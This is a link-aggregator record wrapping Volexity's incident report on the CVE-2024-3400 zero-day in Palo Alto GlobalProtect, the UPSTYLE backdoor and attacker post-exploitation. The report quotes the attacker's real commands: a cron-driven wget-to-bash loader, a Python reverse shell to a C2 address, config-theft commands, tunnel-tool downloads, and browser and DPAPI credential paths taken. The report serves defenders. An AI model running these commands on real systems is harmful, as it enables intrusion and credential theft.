{"aid": "40016985", "title": "CVE-2024-3400 Palo Alto Networks PAN-OS Zero-Day Exploitation", "url": "https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/", "domain": "volexity.com", "votes": 4, "user": "sky_nox", "posted_at": "2024-04-12 19:55:32", "comments": 0, "source_title": "Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)", "source_text": "Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400) | Volexity\n\n  * Request A Demo\n\n  * Breach Assistance\n\n  * Products\n\n    * Products Overview\n    * Volcano\n    * Surge\n  * Services\n\n    * Services Overview\n    * Incident Response\n    * Network Security Monitoring\n    * Proactive Threat Assessments\n    * Threat Intelligence\n    * M&A Cybersecurity Assessments\n  * Company\n\n    * About\n    * News & Press\n    * Careers\n    * Internships\n    * Resources\n  * Blog\n  * Contact\n\nblog\n\n## Zero-Day Exploitation of Unauthenticated Remote Code Execution\nVulnerability in GlobalProtect (CVE-2024-3400)\n\nApril 12, 2024\n\nby Volexity Threat Research\n\nFacebook Twitter Email\n\n> Volexity would like to thank Palo Alto Networks for their partnership,\n> cooperation, and rapid response to this critical issue. Their research can\n> be found here.\n\nOn April 10, 2024, Volexity identified zero-day exploitation of a\nvulnerability found within the GlobalProtect feature of Palo Alto Networks\nPAN-OS at one of its network security monitoring (NSM) customers. Volexity\nreceived alerts regarding suspect network traffic emanating from the\ncustomer\u2019s firewall. A subsequent investigation determined the device had been\ncompromised. The following day, April 11, 2024, Volexity observed further,\nidentical exploitation at another one of its NSM customers by the same threat\nactor.\n\nThe threat actor, which Volexity tracks under the alias UTA0218, was able to\nremotely exploit the firewall device, create a reverse shell, and download\nfurther tools onto the device. The attacker focused on exporting configuration\ndata from the devices, and then leveraging it as an entry point to move\nlaterally within the victim organizations.\n\nVolexity worked closely with its customer and the Palo Alto Networks Product\nSecurity Incident Response Team (PSIRT) to investigate the root cause of the\ncompromise. Through this cooperative investigation, the Palo Alto Networks\nPSIRT team was able to confirm the vulnerability as an OS command injection\nissue and assigned it CVE-2024-3400. The issue is an unauthenticated remote\ncode execution vulnerability with a CVSS base score of 10.0. Palo Alto\nNetworks has since issued an advisory for CVE-2024-3400 that includes\ninformation regarding a threat protection signature released to customers, as\nwell as a timeline for a fix, which at the time of writing is expected April\n14, 2024.\n\nDuring its investigation, Volexity observed that UTA0218 attempted to install\na custom Python backdoor, which Volexity calls UPSTYLE, on the firewall. The\nUPSTYLE backdoor allows the attacker to execute additional commands on the\ndevice via specially crafted network requests. Details on this backdoor are\nincluded further on in this report.\n\nAs Volexity broadened its investigation, it discovered successful exploitation\nat multiple other customers and organizations dating back to March 26, 2024.\nThose attempts appear to be the threat actor testing the vulnerability by\nplacing zero-byte files on firewall devices to validate exploitability. On\nApril 7, 2024, Volexity observed the attacker attempting and failing to deploy\na backdoor on a customer\u2019s firewall device. Three days later, on April 10,\n2024, UTA0218 was observed exploiting firewall devices to successfully deploy\nmalicious payloads. A second compromise Volexity observed on April 11, 2024,\nfollowed a nearly identical playbook. A timeline associated with the discovery\nand subsequent activities is below.\n\nAfter successfully exploiting devices, UTA0218 downloaded additional tooling\nfrom remote servers they controlled in order to facilitate access to victims\u2019\ninternal networks. They quickly moved laterally through victims\u2019 networks,\nextracting sensitive credentials and other files that would enable access\nduring and potentially after the intrusion. The tradecraft and speed employed\nby the attacker suggests a highly capable threat actor with a clear playbook\nof what to access to further their objectives. Volexity is not currently able\nto provide an estimate as to the scale of exploitation taking place. It is\nlikely the firewall device exploitation, followed by hands-on-keyboard\nactivity, was limited and targeted. However, as noted previously, evidence of\npotential reconnaissance activity involving more widespread exploitation aimed\nat identifying vulnerable systems does appear to have occurred at the time of\nwriting.\n\nVolexity strongly recommends organizations using Palo Alto Networks\nGlobalProtect firewall devices read the advisory to ensure their firewall\ndevices have the correct protections in place, or otherwise take mitigation\nactions to ensure they are no longer vulnerable. As always, it should be noted\nthat these mitigations and fixes will not remediate an existing compromise.\nAffected organizations should rapidly investigate their systems and networks\nfor potential breaches.\n\nThis blog post describes the malware the attacker added to compromised\ndevices, observed attempts at lateral movement, and methods organizations can\nuse to identify potential compromise of their networks.\n\n## Analysis\n\n### Investigation Summary\n\nVolexity used telemetry from its own network security sensors, client endpoint\ndetection, response (EDR) software, and forensic data collected from multiple\nsystems to paint a thorough picture of the attacker\u2019s actions in the incidents\ninvestigated.\n\nBelow are the highlights of Volexity\u2019s observations from the course of the\nperformed investigations:\n\n  * Zero-day exploitation of a vulnerability in Palo Alto Global Protect firewall devices that allowed for unauthenticated remote code execution to take place. Initial exploitation was used to create a reverse shell, download tools, exfiltrate configuration data, and move laterally within the network.\n  * The threat actor has developed and attempted to deploy a novel python-based backdoor that Volexity calls UPSTYLE.\n  * The earliest evidence of attempted exploitation observed by Volexity thus far is on March 26, 2024 when attackers appeared to verify that exploitation worked correctly.\n  * The initial persistence mechanism setup by UTA0218 involved configuring a cron job that would use wget to retrieve a payload from an attacker-controlled URL with its output being written to stdout and piped to bash for execution. The attacker used this method to deploy and execute specific commands and download reverse proxy tooling such as GOST (GO Simple Tunnel).\n  * In one case a service account configured for use by the Palo Alto firewall, and a member of the domain admins group, was used by the attackers to pivot internally across the affected networks via SMB and WinRM.\n  * UTA0218\u2019s initial objectives were aimed at grabbing the domain backup DPAPI keys and targeting active directory credentials by obtaining the NTDS.DIT file. They further targeted user workstations to steal saved cookies and login data, along with the users\u2019 DPAPI keys.\n\nA detailed description of the items summarized above can be found in the\nfollowing sections.\n\n### UPSTYLE Backdoor\n\nIn two cases UTA0218 was observed attempting to download and execute a\nbackdoor Volexity calls UPSTYLE. There were two slight variations of this tool\nobserved with only minor differences between the files. In one case the\nfilename used by UTA0218 was update.py. UTA0218 attempted to download and\nexecute this file via the CVE-2024-3400 but was unsuccessful. However,\nVolexity was still able to recover the file for analysis.\n\nName(s)| update.py  \n---|---  \nSize| 5.1KB (5187 Bytes)  \nFile Type| text/plain  \nMD5| 0c1554888ce9ed0da1583dbdf7b31651  \nSHA1| 988fc0d23e6e30c2c46ccec9bbff50b7453b8ba9  \nSHA256| 3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac  \nVirusTotal First Submitted| N/A  \n  \nThe purpose of the update.py script is to deploy a backdoor to the following\npath: /usr/lib/python3.6/site-packages/system.pth. The backdoor, written in\nPython, starts by an import and its main content is stored as a base64 encoded\nblob. The .pth extension is used to append additional paths to a Python\nmodule. Starting with the release of Python 3.5, lines in .pth files beginning\nwith the text \u201cimport\u201d followed by a space or a tab, are executed as described\nin the official documentation. Therefore, by creating this file, each time any\nother code on the device attempts to import the module, the malicious code is\nexecuted.\n\nThe commands to be executed are forged by the attacker by requesting a non-\nexistent web page which contains the specific pattern. The backdoor\u2019s purpose\nis to then parse the web server error log (/var/log/pan/sslvpn_ngx_error.log)\nlooking for the pattern, and to parse and decode data added to the non-\nexistent URI, executing the command contained within. The command output is\nthen appended to a CSS file which is a legitimate part of the firewall\n(/var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css).\n\nAfter the command\u2019s execution is complete and the output has been written, the\nlog entry that was originally read and contained the command is removed from\nthe sslvpn_ngx_error.log file. Fifteen seconds after execution, the original\nversion of bootstrap.min.css is also restored to its previous state. The\naccess and modified timestamps are also restored for both files. Figure 1\nshows UPSTYLE main loop.\n\nFigure 1. UPSTYLE main loop\n\nThe overall workflow of the malware is described in Figure 2.\n\nFigure 2. UPSTYLE workflow\n\n### Post-exploitation Activity\n\nFor the purpose of this blog post, the following filenames and indicators are\nrelated to the exploitation that occurred on April 10, 2024. However, the\nreader should note that in subsequent exploitation, these files were altered\nby UTA0218 for different victims. Their purpose and operation, however, were\nfundamentally the same.\n\nAfter exploitation, the threat actor established persistence by continuously\nfetching and executing the contents of a file named patch. When executed, this\nfile downloads and executes a remotely hosted file named policy. By modifying\nthe contents of the policy file, the threat actor was able to execute a\nvariety of commands on the compromised device. A total of six different\npermutations of the policy file were observed by Volexity.\n\nThe details of the patch file are shown below:\n\nName(s)| patch  \n---|---  \nSize| 160.0B (160 Bytes)  \nFile Type| text/plain  \nMD5| d31ec83a5a79451a46e980ebffb6e0e8  \nSHA1| a7c6f264b00d13808ceb76b3277ee5461ae1354e  \nSHA256| 35a5f8ac03b0e3865b3177892420cb34233c55240f452f00f9004e274a85703c  \nVirusTotal First Submitted| N/A  \n  \nThe contents of the patch file are shown below:\n\n> if [ ! -f '/etc/cron.d/update' ]; then printf \"SHELL=/bin/bash\\n\\n* * * * * root wget -qO- http://172.233.228[.]93/policy | bash\\n\\n\" > /etc/cron.d/update fi\n\nWhen executed, it checks for the existence of a cron file named update. If\nthis cron file does not exist, it creates the file and uses it to establish a\ncron job. It also downloads a remotely hosted file named policy and executes\nit via bash every 60 seconds. The attacker then manually updates the contents\nof the remote file over time to retrieve data from the device and create a\nreverse shell.\n\nInterestingly, the attacker appeared to manually manage an access control list\nfor this command-and-control (C2) server, as it could not be accessed on the\nsame port from any location other than the device communicating with it.\n\n#### Malicious Code Executed via Policy File\n\nSix different versions of the policy file were observed by Volexity. They each\nrepresent a different set of actions taken by the threat actor on a\ncompromised device. The numbered versions that follow are the order in which\nthey were used by the threat actor.\n\nVersion 1\n\nThis file contained a one-liner reverse shell written in Python.\n\nName(s)| policy  \n---|---  \nSize| 287B (287 Bytes)  \nFile Type| text/x-shellscript  \nMD5| a43e3cf908244f85b237fdbacd8d82d5  \nSHA1| e1e427c9b46064e2b483f90b13490e6ef522cc06  \nSHA256| 755f5b8bd67d226f24329dc960f59e11cb5735b930b4ed30b2df77572efb32e8  \nVirusTotal First Submitted| N/A  \n  \n> #!/bin/bash r=`ps -ef | grep \"import sys,socket,os\" | grep -v grep` if [[ -z \"$r\" ]]; then python -c \"import sys,socket,os,pty;s=socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect(('172.233.228[.]93',443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')\" fi\n\nVersion 2\n\nThe attacker removed any previously created CSS files containing various\nattacker command output, and then copied the configuration data from the\nfirewall device into a new file, storing the hostname of the device in the CSS\nfile. These files were saved to an externally accessible web directory where\nthe attacker could subsequently retrieve them.\n\nName(s)| policy  \n---|---  \nSize| 216B (216 Bytes)  \nFile Type| text/x-shellscript  \nMD5| 5e4c623296125592256630deabdbf1d2  \nSHA1| d12b614e9417c4916d5c5bb6ee42c487c937c058  \nSHA256| adba167a9df482aa991faaa0e0cde1182fb9acfbb0dc8d19148ce634608bab87  \nVirusTotal First Submitted| N/A  \n  \n> #!/bin/bash rm -f /var/appweb/sslvpndocs/global-protect/*.css cp\n> /opt/pancfg/mgmt/saved-configs/running-config.xml\n> /var/appweb/sslvpndocs/global-protect/<redacted>.css uname -a >\n> /var/appweb/sslvpndocs/global-protect/<redacted>.css\n\nVersion 3\n\nThis file was used to remove CSS files created in the previous step.\n\nName(s)| policy  \n---|---  \nSize| 62B (62 Bytes)  \nFile Type| text/x-shellscript  \nMD5| 87312a7173889a8a5258c68cac4817bd  \nSHA1| 3ad9be0c52510cbc5d1e184e0066d14c1f394d4d  \nSHA256| c1a0d380bf55070496b9420b970dfc5c2c4ad0a598083b9077493e8b8035f1e9  \nVirusTotal First Submitted| N/A  \n  \n> #!/bin/bash rm -f /var/appweb/sslvpndocs/global-protect/*.css\n\nVersion 4\n\nThis version attempts to download a Golang tunneling tool named GOST and\nexecute it with two different command-line options to establish SOCKS5 and\nRTCP tunnels. However, the threat actor appears to have failed to successfully\ndownload the tool on this attempt.\n\nName(s)| policy  \n---|---  \nSize| 388B (388 Bytes)  \nFile Type| text/x-shellscript  \nMD5| b9f5e9db9eec8d1301026c443363cf6b  \nSHA1| d7a8d8303361ffd124cb64023095da08a262cab4  \nSHA256| fe07ca449e99827265ca95f9f56ec6543a4c5b712ed50038a9a153199e95a0b7  \nVirusTotal First Submitted| N/A  \n  \n> #!/bin/bash wget http://172.233.228[.]93/vpn_prot.gz -O /tmp/vpn_prot.gz ls\n> -l /tmp/vpn_prot.gz > /var/appweb/sslvpndocs/global-protect/u.css gzip -d\n> /tmp/vpn_prot.gz chmod +x /tmp/vpn_prot nohup /tmp/vpn_prot\n> -L=socks5://127.0.0[.]1:8123 > /dev/null 2>&1 & nohup /tmp/vpn_prot -L\n> rtcp://127.0.0[.]1:8080/127.0.0[.]1:8123 -F\n> ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 > /dev/null\n> 2>&1 &\n\nVersion 5\n\nThis is a modified version of Version 4 that successfully downloads GOST in a\nbase64-encoded format.\n\nName(s)| policy  \n---|---  \nSize| 421B (421 Bytes)  \nFile Type| text/x-shellscript  \nMD5| 12b5e30c2276664e87623791085a3221  \nSHA1| f99779a5c891553ac4d4cabf928b2121ca3d1a89  \nSHA256| 96dbec24ac64e7dd5fef6e2c26214c8fe5be3486d5c92d21d5dcb4f6c4e365b9  \nVirusTotal First Submitted| N/A  \n  \n> #!/bin/bash wget http://172.233.228[.]93/vpn.log -O /tmp/vpn.log base64 -d\n> /tmp/vpn.log > /tmp/vpn_prot.gz ls -l /tmp/vpn_prot.gz >\n> /var/appweb/sslvpndocs/global-protect/u.css gzip -d /tmp/vpn_prot.gz chmod\n> +x /tmp/vpn_prot nohup /tmp/vpn_prot -L=socks5://127.0.0[.]1:8123 >\n> /dev/null 2>&1 & nohup /tmp/vpn_prot -L\n> rtcp://127.0.0[.]1:8080/127.0.0.1:8123 -F\n> ssh://user0:[password_redacted]@172.233.228[.]93:8443?ping=180 > /dev/null\n> 2>&1 &\n\nThe details of the GOST sample are as follows:\n\nName(s)| gost-linux-amd64  \n---|---  \nSize| 12.9MB (13578240 Bytes)  \nFile Type| ELF  \nMD5| 089801d87998fa193377b9bfe98e87ff  \nSHA1| 4ad043c8f37a916761b4c815bed23f036dfb7f77  \nSHA256| 448fbd7b3389fe2aa421de224d065cea7064de0869a036610e5363c931df5b7c  \nVirusTotal First Submitted| 2023-01-29 01:30:47 UTC | af632c50 (api) - Unknown US  \n  \nVersion 6\n\nThis file contains commands to download and execute an open-source reverse\nshell that operates over SSH. The threat actor configures this shell to run on\nport 31289.\n\nName(s)| policy(6)  \n---|---  \nSize| 189.0B (189 Bytes)  \nFile Type| text/x-shellscript  \nMD5| 724c8059c150b0f3d1e0f80370bcfe19  \nSHA1| 5592434c40a30ed2dfdba0a86832b5f2eaaa437c  \nSHA256| e315907415eb8cfcf3b6a4cd6602b392a3fe8ee0f79a2d51a81a928dbce950f8  \nVirusTotal First Submitted| N/A  \n  \n> #!/bin/bash wget http://172.233.228[.]93/lowdp -O /tmp/lowdp ls -l\n> /tmp/lowdp > /var/appweb/sslvpndocs/global-protect/u.css chmod +x /tmp/lowdp\n> nohup /tmp/lowdp -l -p 31289 > /dev/null 2>&1 &\n\nDetails of the binary are shown below:\n\nName(s)| reverse-sshx64  \n---|---  \nSize| 3.5MB (3690496 Bytes)  \nFile Type| ELF  \nMD5| 427258462c745481c1ae47327182acd3  \nSHA1| ef8036eb4097789577eff62f6c9580fa130e7d56  \nSHA256| 161fd76c83e557269bee39a57baa2ccbbac679f59d9adff1e1b73b0f4bb277a6  \nVirusTotal First Submitted| 2022-08-08 18:30:19 UTC | 1c0b809a (web) - Unknown NL  \n  \n### Lateral Movement & Data theft\n\nIn one instance of successful compromise, a highly privileged service account\nused by the Palo Alto Networks firewall device was used by the attacker to\npivot into the internal network via SMB and WinRM. The targeted data included\nthe Active Directory database (ntds.dit), key data (DPAPI) and Windows event\nlogs (Microsoft-Windows-TerminalServices-\nLocalSessionManager%4Operational.evtx).\n\nIn addition to Windows-related data, the attacker also stole Login Data,\nCookies, and Local State data for Chrome and Microsoft Edge from specific\ntargets. With this data, the attacker was able to grab the browser master key\nand decrypt sensitive data, such as stored credentials.\n\nThe list of files grabbed by the attacker is below:\n\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\n%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State\n%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Login Data\n%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Network\n%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies\n%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Local State\n%APPDATA%\\Roaming\\Microsoft\\Protect\\<SID> -> DPAPI Keys\n%SystemRoot%\\NTDS\\ntds.dit %SystemRoot%\\System32\\winevt\\Logs\\Microsoft-\nWindows-TerminalServices-LocalSessionManager%4Operational.evtx\n\nUTA0218 was not observed deploying malware or additional methods of\npersistence on systems within victim networks. This may be due in part to the\nrapid detection and response by Volexity and its customers. The stolen data\ndid allow the attacker to effectively compromise credentials for all domain\naccounts. Further, the attacker gained access and could potentially use valid\ncredentials or cookies taken from browser data for specific user workstations\naccessed.\n\n### Infrastructure\n\nVolexity observed UTA0218 leveraging a mix of infrastructure during their\noperations, which can be broadly broken into two categories:\n\n  * C2 infrastructure hosting malware, used for communication channels\n  * Anonymized source infrastructure, used to access tooling and interact with victim infrastructure\n\nThe anonymized infrastructure appears to have included a mix of VPN usage, as\nwell as potentially compromised ASUS routers. The infrastructure was used to\naccess files created by the attacker. Additionally, UTA0218 abused a\ncompromised AWS bucket and various Virtual Private Servers (VPS) providers to\nstore malicious files. The infrastructure observed by Volexity does not have\nany overlaps with other threat actors in Volexity\u2019s aperture at this time.\n\n## Detecting Compromise\n\nThere are two primary methods for identifying compromise on an impacted\nfirewall device. The first method involves monitoring network traffic and\nactivity emanating from Palo Alto Networks firewall devices. Volexity is still\nworking to coordinate with Palo Alto Networks regarding the second method and\nthus is not describing it at this time. Volexity will update this blog post\nwhen more details can be made available.\n\nThe section that follows describes what organizations can do to look for signs\nof compromise. Any of these methods can provide strong evidence that the Palo\nAlto Networks GlobalProtect firewall device is compromised. Should signs of\ncompromise be identified, refer to Responding to Compromise for what to do\nnext.\n\n### Network Traffic Analysis\n\nVolexity initially identified activity that led to the discovery of the Palo\nAlto Networks GlobalProtect firewall device exploitation via an alert for\nmalicious network requests generated by Volexity's NSM sensors. Review of\nnetwork traffic logs for outbound connections originating from the\nGlobalProtect firewall device, as well as destined for the device, can help\nidentify anomalous activity. Example activity that Volexity observed from\ncompromised GlobalProtect devices includes the following:\n\n  * Direct-to-IP HTTP requests to download files noted in the previous section via wget While it would not be uncommon to observe wget requests for files in a larger environment, this type of request originating from the firewall device is not something Volexity has observed outside of the attacker activity.\n  * SMB / RDP connections to multiple systems across the environment, originating from the GlobalProtect appliance\n  * SMB file transfers of Google Chrome or Microsoft Edge browser data or the ntds.dit file\n  * HTTP request for the URL worldtimeapi[.]org/api/timezone/etc/utc originating from the Global Protect appliance While this hostname is legitimate, in both occurrences of compromise an HTTP GET request to this URL was observed. This does not appear to be a commonly occurring network request.\n\nVolexity also leveraged its customer\u2019s Endpoint Detection and Response (EDR)\nsoftware to investigate alerts that triggered for data exfiltration over SMB.\nHaving both network visibility and EDR telemetry allowed Volexity to fully map\nout all systems the attacker accessed via the compromised GlobalProtect\nfirewall device.\n\n### GlobalProtect Firewall Device Log Analysis\n\nDuring Volexity\u2019s incident response investigations, the affected customers\nwere able to generate a tech support file from the compromised firewall\ndevices. This tech support file is an archive that contains files Palo Alto\nNetworks tech support can use to troubleshoot issues organizations are having\nwith their firewall devices. It also contains logs Volexity noted as having\nkey forensic artifacts and could potentially help determine if a device is\ncompromised.\n\nTo generate a tech support file, Palo Alto GlobalProtect system administrators\ncan navigate within the WebGUI to the Device tab, or if in Panorama to the\nPanorama tab. From here, navigate to the \u201cSupport\u201d page and look under the\nTech Support File section for \"Generate Tech Support File.\u201d Clicking this will\ngenerate a tech support file that can be downloaded by selecting \u201cDownload\nTech Support File\u201d when it becomes available. This may also be done via the\ncommand-line interface using one of two commands:\n\n  * tftp export tech-support to <tftp host>\n  * scp export tech-support to <username@host:path>\n\nMore information on this process from Palo Alto Networks can be found here.\n\n## Responding to Compromise\n\nIf you discover that your Palo Alto Network GlobalProtect firewall device is\ncompromised, it is important to take immediate action. Make sure to not wipe\nor rebuild the appliance. Collecting logs, generating a tech support file, and\npreserving forensics artifacts (memory and disk) from the device are crucial.\n\nPivoting to analyzing internal systems and tracking potential lateral movement\nshould be done as soon as possible. Further, any credentials, secrets, or\nother sensitive data that may have been stored on the GlobalProtect firewall\ndevice should be considered compromised. This may warrant password resets,\nchanging of secrets, and additional investigations.\n\nVolexity strongly recommends that organizations look for signs of lateral\nmovement internally from their Palo Alto Networks GlobalProtect firewall\ndevice that is not consistent with expected behavior. Proactive checks of any\nexternally facing infrastructure may also be warranted if internal visibility\nis limited.\n\nIf you need assistance validating or responding to a breach, please feel free\nto contact Volexity for breach assistance.\n\n## Conclusion\n\nTargeting edge devices remains a popular vector of attack for capable threat\nactors who have the time and resources to invest into researching new\nvulnerabilities. Having a robust detection stack is critical in identifying\nactivity related to exploits, inclusive of network monitoring and EDR\ncapabilities to identify lateral movement. Early detection of intrusions\ngreatly reduces the scope and costs associated to mitigation.\n\nVolexity tracks activity described in this blog post under the moniker\nUTA0218. At the time of writing, Volexity was unable to link the activity to\nother threat activity. Volexity assesses that it is highly likely UTA0218 is a\nstate-backed threat actor based on the resources required to develop and\nexploit a vulnerability of this nature, the type of victims targeted by this\nactor, and the capabilities displayed to install the Python backdoor and\nfurther access victim networks.\n\nAs with previous public disclosures of vulnerabilities in these kinds of\ndevices, Volexity assesses that it is likely a spike in exploitation will be\nobserved over the next few days by UTA0218 and potentially other threat actors\nwho may develop exploits for this vulnerability. This spike in activity will\nbe driven by the urgency of this window of access closing due to mitigations\nand patches being deployed. It is therefore imperative that organizations act\nquickly to deploy recommended mitigations and perform compromise reviews of\ntheir devices to check whether further internal investigation of their\nnetworks is required.\n\nThis blog post provided guidance on prevention and detection; related\nindicators can also be downloaded from the Volexity GitHub page:\n\n  * YARA rules\n  * Single value indicators\n\n0day, APT, Exploit, firewall, Global Protect, Palo Alto Networks, RCE, zero-\nday\n\n  * #### Recent Posts\n\n    * Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)\n    * CharmingCypress: Innovating Persistence\n    * How Memory Forensics Revealed Exploitation of Ivanti Connect Secure VPN Zero-Day Vulnerabilities\n    * Ivanti Connect Secure VPN Exploitation: New Observations\n    * Ivanti Connect Secure VPN Exploitation Goes Global\n\n  * #### Archives\n\n    * April 2024\n    * February 2024\n    * January 2024\n    * September 2023\n    * June 2023\n    * March 2023\n    * December 2022\n    * August 2022\n    * July 2022\n    * June 2022\n    * March 2022\n    * February 2022\n    * December 2021\n    * August 2021\n    * May 2021\n    * March 2021\n    * December 2020\n    * November 2020\n    * April 2020\n    * March 2020\n    * September 2019\n    * November 2018\n    * September 2018\n    * August 2018\n    * July 2018\n    * June 2018\n    * April 2018\n    * November 2017\n    * July 2017\n    * March 2017\n    * November 2016\n    * October 2015\n    * July 2015\n    * June 2015\n    * April 2015\n    * October 2014\n    * September 2014\n\n  * #### Tags\n\npulsesecure China phishing crimeware vulnerabilities APT malware RCE ivanti\nconnect secure VPN backdoor Exploit memory forensics spear phishing exploits\n0day Threat Intelligence Scanning webshell North Korea\n\n\u00a9 2024 Volexity. All Rights Reserved.\n\n  * About\n\n    * About Us\n    * Blog\n    * Privacy Policy\n  * Solutions\n\n    * Request A Demo\n    * Products\n    * Services\n\nContact\n\n  * 11654 Plaza America Dr #774 Reston, VA 20190-4700\n  * 1-888-825-1975\n\nConnect\n\n", "frontpage": true}
